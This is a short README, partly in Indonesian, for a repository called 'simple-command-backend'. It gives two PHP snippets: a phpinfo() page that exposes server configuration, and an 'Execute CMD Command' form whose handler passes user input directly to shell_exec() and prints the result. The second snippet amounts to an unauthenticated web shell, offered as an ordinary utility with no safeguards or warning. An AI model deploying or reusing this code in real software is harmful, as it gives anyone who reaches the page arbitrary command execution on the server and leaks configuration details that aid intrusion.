# simple-command-backend
1. Menampilkan informasi PHP
```
    <?php
    // Menampilkan informasi PHP
    phpinfo();
    ?>
```

2. Execute CMD Command
   ```
           <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>CMD Executor</title>
        </head>
        <body>
            <h1>Execute CMD Command</h1>
            <form method="post">
                <input type="text" name="command" placeholder="Enter command" required>
                <button type="submit">Execute</button>
            </form>
        </body>
        </html>
        
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Ambil perintah dari input
            $command = $_POST['command'];
        
            // Jalankan perintah dan simpan output
            $output = shell_exec($command);
        
            // Tampilkan output
            echo "<pre>$output</pre>";
        }
        ?>
   ```
